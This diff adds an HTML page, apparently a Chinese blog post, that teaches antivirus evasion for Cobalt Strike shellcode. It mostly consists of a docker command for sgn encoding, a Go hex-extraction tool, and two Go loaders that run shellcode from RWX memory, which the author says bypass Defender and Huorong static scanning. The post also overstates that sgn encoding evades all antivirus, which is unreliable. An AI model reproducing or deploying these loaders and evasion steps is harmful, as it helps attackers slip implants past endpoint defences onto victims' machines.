@@ -1,0 +1,582 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.24.0 by Michael Rose
+  Copyright 2013-2020 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>Shellcode加密 - Yueyejian’s Blog</title>
+<meta name="description" content="Shellcode加密 0x00 写在前面 今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。">
+
+
+  <meta name="author" content="yueyejian">
+  
+  <meta property="article:author" content="yueyejian">
+  
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="Yueyejian's Blog">
+<meta property="og:title" content="Shellcode加密">
+<meta property="og:url" content="http://localhost:4000/antivirus-evasion/shellcode/">
+
+
+  <meta property="og:description" content="Shellcode加密 0x00 写在前面 今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。">
+
+
+
+
+
+
+
+  <meta property="article:published_time" content="2024-11-20T00:00:00+08:00">
+
+
+
+
+
+
+<link rel="canonical" href="http://localhost:4000/antivirus-evasion/shellcode/">
+
+
+
+
+<script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    
+      "@type": "Person",
+      "name": "yueyejian",
+      "url": "http://localhost:4000/"
+    
+  }
+</script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+<link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+<noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5/css/all.min.css"></noscript>
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+<link rel="shortcut icon" href="/assets/images/favicon.ico">
+<!-- end custom head snippets -->
+  </head>
+
+  <body class="layout--single wide">
+    <nav class="skip-links">
+  <ul>
+    <li><a href="#site-nav" class="screen-reader-shortcut">Skip to primary navigation</a></li>
+    <li><a href="#main" class="screen-reader-shortcut">Skip to content</a></li>
+    <li><a href="#footer" class="screen-reader-shortcut">Skip to footer</a></li>
+  </ul>
+</nav>
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+        <a class="site-title" href="/">
+          Yueyejian's Blog
+          
+        </a>
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/categories/">Categories</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/">Tags</a>
+            </li></ul>
+        
+        <button class="search__toggle" type="button">
+          <span class="visually-hidden">Toggle search</span>
+          <i class="fas fa-search"></i>
+        </button>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+
+
+    <div class="initial-content">
+      
+
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person" class="h-card">
+
+  
+    <div class="author__avatar">
+      <a>
+        <img src="/assets/images/avatar.jpg" alt="yueyejian" itemprop="image" class="u-photo">
+      </a>
+    </div>
+  
+
+  <div class="author__content">
+    <h3 class="author__name p-name" itemprop="name">
+      <a>yueyejian</a>
+    </h3>
+    
+      <div class="author__bio p-note" itemprop="description">
+        
+
+      </div>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+        <li itemprop="homeLocation" itemscope itemtype="https://schema.org/Place">
+          <i class="fas fa-fw fa-map-marker-alt" aria-hidden="true"></i> <span itemprop="name" class="p-locality">ワノ国</span>
+        </li>
+      
+
+      
+        
+          
+            <li><a href="https://yueyejian13.github.io" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-home" aria-hidden="true"></i><span class="label">首页</span></a></li>
+          
+        
+          
+            <li><a href="https://github.com/yueyejian13" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fab fa-fw fa-github" aria-hidden="true"></i><span class="label">GitHub</span></a></li>
+          
+        
+          
+            <li><a href="https://paypal.me/yueyejian?country.x=C2&locale.x=zh_XC" rel="nofollow noopener noreferrer me" itemprop="sameAs"><i class="fas fa-fw fa-link" aria-hidden="true"></i><span class="label">buymeacoffee</span></a></li>
+          
+        
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+  
+  </div>
+
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Shellcode加密">
+    <meta itemprop="description" content="Shellcode加密0x00 写在前面今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。">
+    <meta itemprop="datePublished" content="2024-11-20T00:00:00+08:00">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Shellcode加密
+</h1>
+          
+
+  <p class="page__meta">
+    
+      
+      <span class="page__meta-date">
+        <i class="far fa-calendar-alt" aria-hidden="true"></i>
+        
+        <time datetime="2024-11-20T00:00:00+08:00">November 20, 2024</time>
+      </span>
+    
+
+    <span class="page__meta-sep"></span>
+
+    
+      
+      
+
+      <span class="page__meta-readtime">
+        <i class="far fa-clock" aria-hidden="true"></i>
+        
+          4 minute read
+        
+      </span>
+    
+  </p>
+
+
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+          <aside class="sidebar__right ">
+            <nav class="toc">
+              <header><h4 class="nav__title"><i class="fas fa-file-alt"></i> Contents</h4></header>
+              <ul class="toc__menu"><li><a href="#shellcode加密">Shellcode加密</a><ul><li><a href="#0x00-写在前面">0x00 写在前面</a></li><li><a href="#0x01-shellcode生成">0x01 Shellcode生成</a></li><li><a href="#0x02-shellcode加密">0x02 Shellcode加密</a></li><li><a href="#0x03-shellcode-loader">0x03 Shellcode Loader</a></li><li><a href="#0x04-免杀某绒">0x04 免杀某绒</a></li></ul></li></ul>
+
+            </nav>
+          </aside>
+        
+        <h1 id="shellcode加密">Shellcode加密</h1>
+<h2 id="0x00-写在前面">0x00 写在前面</h2>
+<p>今年6月份辞掉了我那份摸鱼的工作，至今为止，已经找了快3个月的工作了，个人认为是如今的经济大环境差以及网络安全的发展迅速，导致了像我这样没有什么特长的web狗很难找到一份心仪的工作。</p>
+
+<p>不多bb了，关于免杀，网络上的教程还是比较多的，也是我比较感兴趣的内容，我目前的学习路线是：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>1. 免杀知识（Shellcode加密、减少熵、反沙箱、导入表隐藏、etw和amsi修补、系统调用、unhook、白加黑、opsec杀人于无形、c2选择等）
+2. 把网络知识补上（Wireshark分析等）
+3. 进源渗透的一些思路
+4. 工具开发（Golang、Cobaltstrike插件开发等）
+5. 内网该会的都得会
+</code></pre></div></div>
+<h2 id="0x01-shellcode生成">0x01 Shellcode生成</h2>
+
+<p><img src="/images/antivirus/shellcode/1.jpg" alt="" /></p>
+
+<p>Shellcode是一段用于利用软件漏洞而执行的代码，Shellcode为16进制之机械码，以其经常让攻击者获得Shell而得名。用Cobaltstrike &gt; Payloads &gt; 可以分别生成有阶段和无阶段的Payload，输出格式选择Raw（原始二进制数据），即可生成一段我们所需要的Shellcode。那么Shellcode到底是二进制还是十六进制呢？本质上是二进制数据，十六进制只不过是二进制的另一种可视化形式。</p>
+
+<p>Stager和Stageless的区别是C4和导弹的区别，Stager小巧但容易被发现，Stageless可瞬爆但体积过大不利于传输</p>
+
+<h2 id="0x02-shellcode加密">0x02 Shellcode加密</h2>
+
+<p>Shellcode加密一般用sgn加密，Shikata ga nai日语是没有办法。需要先安装 keystone engine来作为依赖，可以用docker容器的方式直接跳过依赖库的安装。sgn加密后的Shellcode无需解密，可直接写入内存并执行，并且可以规避一切杀软的检测，这两个优点使sgn加密成为Shellcode加密最好的办法。也可以自己写脚本对Shellcode进行异或、求反、反转等一系列运算后再解密，达到了一定的混淆程度之后同样可以规避杀软。</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>docker pull egee/sgn
+
+docker run -it -v /tmp/:/tmp/ egee/sgn -a 64 /tmp/shellcode
+</code></pre></div></div>
+
+<p>用以下小工具可以轻松提取shellcode的16进制数组：</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+<span class="c">//sctool by yueyejian</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"encoding/hex"</span>
+	<span class="s">"flag"</span>
+	<span class="s">"fmt"</span>
+	<span class="s">"io/ioutil"</span>
+	<span class="s">"strings"</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="c">// 定义 -f 参数，用于指定文件名</span>
+	<span class="n">filename</span> <span class="o">:=</span> <span class="n">flag</span><span class="o">.</span><span class="n">String</span><span class="p">(</span><span class="s">"f"</span><span class="p">,</span> <span class="s">""</span><span class="p">,</span> <span class="s">"Path to the binary file (e.g., payload.bin)"</span><span class="p">)</span>
+	<span class="n">flag</span><span class="o">.</span><span class="n">Parse</span><span class="p">()</span>
+
+	<span class="c">// 检查是否提供了文件名</span>
+	<span class="k">if</span> <span class="o">*</span><span class="n">filename</span> <span class="o">==</span> <span class="s">""</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"Error: No file specified. Use -f to specify the file path."</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="c">// 读取指定的二进制文件</span>
+	<span class="n">data</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">ioutil</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="o">*</span><span class="n">filename</span><span class="p">)</span>
+	<span class="k">if</span> <span class="n">err</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
+		<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"Error reading file '%s': %v</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="o">*</span><span class="n">filename</span><span class="p">,</span> <span class="n">err</span><span class="p">)</span>
+		<span class="k">return</span>
+	<span class="p">}</span>
+
+	<span class="c">// 1. 紧凑的十六进制字符串</span>
+	<span class="n">compactHex</span> <span class="o">:=</span> <span class="n">hex</span><span class="o">.</span><span class="n">EncodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+
+	<span class="c">// 2. C 风格转义字符串</span>
+	<span class="k">var</span> <span class="n">escapedHex</span> <span class="n">strings</span><span class="o">.</span><span class="n">Builder</span>
+	<span class="k">for</span> <span class="n">_</span><span class="p">,</span> <span class="n">b</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span> <span class="p">{</span>
+		<span class="n">escapedHex</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"</span><span class="se">\\</span><span class="s">x%02x"</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
+	<span class="p">}</span>
+
+	<span class="c">// 3. C 风格数组</span>
+	<span class="k">var</span> <span class="n">cArray</span> <span class="n">strings</span><span class="o">.</span><span class="n">Builder</span>
+	<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="s">"{"</span><span class="p">)</span>
+	<span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">b</span> <span class="o">:=</span> <span class="k">range</span> <span class="n">data</span> <span class="p">{</span>
+		<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="n">fmt</span><span class="o">.</span><span class="n">Sprintf</span><span class="p">(</span><span class="s">"0x%02x"</span><span class="p">,</span> <span class="n">b</span><span class="p">))</span>
+		<span class="k">if</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="m">1</span> <span class="p">{</span>
+			<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="s">", "</span><span class="p">)</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="n">cArray</span><span class="o">.</span><span class="n">WriteString</span><span class="p">(</span><span class="s">"}"</span><span class="p">)</span>
+
+	<span class="c">// 打印结果</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"紧凑的十六进制字符串:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">compactHex</span><span class="p">)</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">C 风格转义字符串:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="n">escapedHex</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">C 风格数组:"</span><span class="p">)</span>
+	<span class="n">fmt</span><span class="o">.</span><span class="n">Println</span><span class="p">(</span><span class="s">"[]byte"</span> <span class="o">+</span> <span class="n">cArray</span><span class="o">.</span><span class="n">String</span><span class="p">())</span>
+<span class="p">}</span>
+
+</code></pre></div></div>
+
+<h2 id="0x03-shellcode-loader">0x03 Shellcode Loader</h2>
+<p>以下是一个用Go写的Shellcode加载器，结合上面的Shellcode加密可以轻松绕过Defender</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"syscall"</span>
+	<span class="s">"unsafe"</span>
+<span class="p">)</span>
+
+<span class="k">const</span> <span class="p">(</span>
+	<span class="n">MEM_COMMIT</span>             <span class="o">=</span> <span class="m">0x1000</span>
+	<span class="n">MEM_RESERVE</span>            <span class="o">=</span> <span class="m">0x2000</span>
+	<span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="m">0x40</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="p">(</span>
+		<span class="n">kernel32</span>      <span class="o">=</span> <span class="n">syscall</span><span class="o">.</span><span class="n">MustLoadDLL</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)</span>
+		<span class="n">VirtualAlloc</span>  <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"VirtualAlloc"</span><span class="p">)</span>
+		<span class="n">RtlCopyMemory</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"RtlCopyMemory"</span><span class="p">)</span>
+		<span class="n">shellcode_buf</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">{}</span>
+	<span class="p">)</span>
+	<span class="n">addr</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)),</span> <span class="n">MEM_COMMIT</span><span class="o">|</span><span class="n">MEM_RESERVE</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>
+	<span class="n">RtlCopyMemory</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr</span><span class="p">)(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode_buf</span><span class="p">[</span><span class="m">0</span><span class="p">])),</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)))</span>
+	<span class="n">syscall</span><span class="o">.</span><span class="n">Syscall</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>编译成可执行文件</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>go build <span class="nt">-ldflags</span><span class="o">=</span><span class="s2">"-w -s -H windowsgui"</span> <span class="nt">-trimpath</span> main.go
+</code></pre></div></div>
+
+<h2 id="0x04-免杀某绒">0x04 免杀某绒</h2>
+<p>修改加载器代码</p>
+<div class="language-go highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">package</span> <span class="n">main</span>
+
+<span class="k">import</span> <span class="p">(</span>
+	<span class="s">"syscall"</span>
+	<span class="s">"unsafe"</span>
+<span class="p">)</span>
+
+<span class="k">const</span> <span class="p">(</span>
+	<span class="n">MEM_COMMIT</span>             <span class="o">=</span> <span class="m">0x1000</span>
+	<span class="n">MEM_RESERVE</span>            <span class="o">=</span> <span class="m">0x2000</span>
+	<span class="n">PAGE_EXECUTE_READWRITE</span> <span class="o">=</span> <span class="m">0x40</span>
+<span class="p">)</span>
+
+<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
+	<span class="k">var</span> <span class="p">(</span>
+		<span class="n">kernel32</span>      <span class="o">=</span> <span class="n">syscall</span><span class="o">.</span><span class="n">MustLoadDLL</span><span class="p">(</span><span class="s">"kernel32.dll"</span><span class="p">)</span>
+		<span class="n">VirtualAlloc</span>  <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"VirtualAlloc"</span><span class="p">)</span>
+		<span class="n">RtlCopyMemory</span> <span class="o">=</span> <span class="n">kernel32</span><span class="o">.</span><span class="n">MustFindProc</span><span class="p">(</span><span class="s">"RtlCopyMemory"</span><span class="p">)</span>
+		<span class="n">shellcode_buf</span> <span class="o">=</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">{}</span>
+	<span class="p">)</span>
+	<span class="n">addr</span><span class="p">,</span> <span class="n">_</span><span class="p">,</span> <span class="n">_</span> <span class="o">:=</span> <span class="n">VirtualAlloc</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="m">0</span><span class="p">,</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)),</span> <span class="n">MEM_COMMIT</span><span class="p">,</span> <span class="n">PAGE_EXECUTE_READWRITE</span><span class="p">)</span>
+	<span class="n">RtlCopyMemory</span><span class="o">.</span><span class="n">Call</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="p">(</span><span class="kt">uintptr</span><span class="p">)(</span><span class="n">unsafe</span><span class="o">.</span><span class="n">Pointer</span><span class="p">(</span><span class="o">&amp;</span><span class="n">shellcode_buf</span><span class="p">[</span><span class="m">0</span><span class="p">])),</span> <span class="kt">uintptr</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">shellcode_buf</span><span class="p">)))</span>
+	<span class="n">syscall</span><span class="o">.</span><span class="n">Syscall</span><span class="p">(</span><span class="n">addr</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">,</span> <span class="m">0</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>可以过火绒静态检测，可以命令执行，但是会在安全日志下留下记录</p>
+
+        
+      </section>
+
+      <footer class="page__meta">
+        
+        
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-tags" aria-hidden="true"></i> Tags: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/tags/#golang" class="page__taxonomy-item" rel="tag">golang</a>
+    
+    </span>
+  </p>
+
+
+
+
+  
+
+
+  
+
+  <p class="page__taxonomy">
+    <strong><i class="fas fa-fw fa-folder-open" aria-hidden="true"></i> Categories: </strong>
+    <span itemprop="keywords">
+    
+      <a href="/categories/#antivirus-evasion" class="page__taxonomy-item" rel="tag">antivirus-evasion</a>
+    
+    </span>
+  </p>
+
+
+        
+
+  <p class="page__date"><strong><i class="fas fa-fw fa-calendar-alt" aria-hidden="true"></i> Updated:</strong> <time datetime="2024-11-20T00:00:00+08:00">November 20, 2024</time></p>
+
+
+      </footer>
+
+      
+
+      
+  <nav class="pagination">
+    
+      <a href="/exploit/fastjson/" class="pagination--pager" title="fastjson-1.2.24-RCE
+">Previous</a>
+    
+    
+      <a href="#" class="pagination--pager disabled">Next</a>
+    
+  </nav>
+
+    </div>
+
+    
+  </article>
+
+  
+  
+</div>
+
+    </div>
+
+    
+      <div class="search-content">
+        <div class="search-content__inner-wrap"><form class="search-content__form" onkeydown="return event.key != 'Enter';">
+    <label class="sr-only" for="search">
+      Enter your search term...
+    </label>
+    <input type="search" id="search" class="search-input" tabindex="-1" placeholder="Enter your search term..." />
+  </form>
+  <div id="results" class="results"></div></div>
+
+      </div>
+    
+
+    <div id="footer" class="page__footer">
+      <footer>
+        <!-- start custom footer snippets -->
+
+<!-- end custom footer snippets -->
+        <div class="page__footer-follow">
+  <ul class="social-icons">
+    
+
+    
+
+    
+  </ul>
+</div>
+
+<div class="page__footer-copyright">&copy; 2019-2024 Yueyejian. Powered by <a href="https://jekyllrb.com" rel="nofollow">Jekyll</a> &amp; <a href="https://mademistakes.com/work/minimal-mistakes-jekyll-theme/" rel="nofollow">Minimal Mistakes</a>.</div>
+      </footer>
+    </div>
+
+    
+  <script src="/assets/js/main.min.js"></script>
+
+
+
+
+<script src="/assets/js/lunr/lunr.min.js"></script>
+<script src="/assets/js/lunr/lunr-store.js"></script>
+<script src="/assets/js/lunr/lunr-en.js"></script>
+
+
+
+
+
+
+
+  </body>
+</html>
